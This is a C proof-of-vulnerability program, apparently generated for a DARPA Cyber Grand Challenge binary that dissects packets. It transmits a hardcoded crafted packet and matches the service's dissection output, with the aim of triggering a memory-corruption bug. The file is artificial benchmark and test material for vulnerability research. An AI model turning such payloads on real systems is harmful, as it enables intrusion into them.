#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb3\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x9b\x01\x00\x00\x93\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x93\x01\x00\x00"
         "\x72\x5a\xd6\xd8\x21\xed\x9f\x0e\x87\x8c\x9e\xb3\x2b\xa6\x1c\x68"
         "\xda\xed\x35\xc9\x54\x00\x00\x00\x3f\x50\xc7\x21\x2c\xe5\x50\xde"
         "\x01\x43\xe8\x17\xc4\x37\xea\xb6\x58\xba\xa6\x32\x01\xa1\x77\x9a"
         "\x2b\x28\xc5\x3b\x7d\xd8\x57\x76\xf8\x30\xc6\x08\x64\xb2\xc6\x1d"
         "\x3a\xc2\xc8\xe9\x11\x48\x1e\xac\x40\xf6\x3c\x3b\xc9\xfb\x80\x92"
         "\x1f\x1e\x6c\x01\xdb\x41\x00\x39\xca\x47\x35\x9e\x27\xca\xe5\x01"
         "\x00\x1d\x94\x30\xee\xb6\x7c\xe0\x94\x4d\x41\x00\x64\xa8\x22\xcf"
         "\x49\x71\x75\x66\x41\x00\x01\x31\x25\x85\x78\x53\xed\xbb\xc6\xf2"
         "\x01\x00\x94\x01\x00\xff\x29\xd8\xff\x60\x22\x16\x78\x2e\x2e\x68"
         "\xb7\x1d\xd4\xe7\xe6\x3a\xa6\xf9\x53\xcf\xbe\x25\xf2\xf5\xe9\xa3"
         "\x71\xaf\xf1\x00\xf0\x31\x11\xed\xb0\x7e\x74\xe8\x30\x4e\xd0\x60"
         "\x7a\x67\x88\x62\x93\xb2\x3d\xad\x66\x8b\x2f\x92\x66\x0d\x0e\x85"
         "\x3c\x8c\x26\x55\x4c\xeb\xaa\x7f\x1b\xd3\xbf\x4b\x0b\xc2\xbb\xe4"
         "\xa9\xb0\x5b\xff\xd1\x17\x42\xd5\xc2\xf9\x7c\x5b\x9a\x14\x22\x4f"
         "\xe6\x10\x32\x68\x08\xe1\xd3\x06\x98\x7c\x8a\x74\x75\x7b\xf1\x2e"
         "\xa5\xaa\x66\xa1\x48\xac\xfd\x09\x60\xc9\xdc\x0b\x00\xa0\xdc\x4e"
         "\x50\xed\x1c\xc3\xa7\xde\xab\x5a\x2d\xb5\xd6\x9b\x4f\xee\x68\x39"
         "\x28\x23\x8d\x94\xb4\xed\x0f\x25\xec\xc1\xb4\xc2\xb4\x71\x22\xed"
         "\x43\xad\xa0\x8d\x0a\x72\xfb\x61\x4b\x64\x4c\xf0\x66\x34\x63\xac"
         "\x20\xb6\x98\x54\xb3\x87\x68\xbb\x90\x4f\x23\xab\x06\x0b\x82\x6c"
         "\xd2\xd7\xcc\x01\x3b\xd9\x71\x4e\xb4\x97\xb4\x1e\x63\xea\x1a\x46"
         "\x40\x9b\x25\xe2\x68\x56\xfd\x20\x01\xd2\xc9\xe9\x36\x33\xaa\x7e"
         "\x85\x0a\x7a\x0a\xc3\x59\xa5\xad\x43\x43\xa2\x5b\x22\x43\x6c\x7f"
         "\x4e\xca\xa6\x8c\xa8\x98\x48\x97\x86\x98\x38\x1d\x4c\x30\x3c\xbb"
         "\x9c\xd5\xdb\x0f\xd2\xba\x99\x9e\x35\x1a\x8b\x29\x8b\xbc\xfa\xa6"
         "\x51\x41\x00";
      static unsigned int write_00001_00000_len = 435;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaposit
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x70\x6f\x73\x69\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
